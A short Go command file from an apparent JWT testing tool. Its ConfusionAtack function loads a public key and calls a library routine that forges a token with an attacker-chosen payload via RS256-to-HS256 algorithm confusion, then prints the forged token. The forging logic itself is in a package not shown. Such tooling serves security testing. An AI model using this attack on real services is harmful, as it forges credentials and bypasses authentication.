package cmd

import (
	"fmt"
	"jwttool/pkg/jwt"
	"os"
)

func ConfusionAtack(tokenString string, newPayload map[string]interface{}, publicKeyPath string) {
	publicKeyPEM, err := os.ReadFile(publicKeyPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading public key file: %v\n", err)
		return
	}

	newToken, err := jwt.ConfusionAtack(tokenString, newPayload, string(publicKeyPEM))
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error performing confusion attack: %v\n", err)
		return
	}
	fmt.Println("New token with 'HS256' algorithm (signed using the provided key bytes):")
	fmt.Println(newToken)
}
